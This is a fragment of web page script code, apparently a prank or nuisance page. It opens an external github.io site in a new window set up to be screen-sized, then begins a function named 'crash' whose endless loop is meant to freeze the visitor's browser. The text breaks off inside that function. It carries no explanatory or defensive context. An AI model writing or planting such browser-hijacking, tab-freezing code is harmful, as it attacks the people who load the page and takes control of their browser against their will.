    <script>
        params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
width=10000,height=10000,left=0,top=0`;
        window.open("https://dagens-norge.github.io/", "_blank");</script>
    
    <script>

        {

        function crash()
        {
        while (true) {

        }
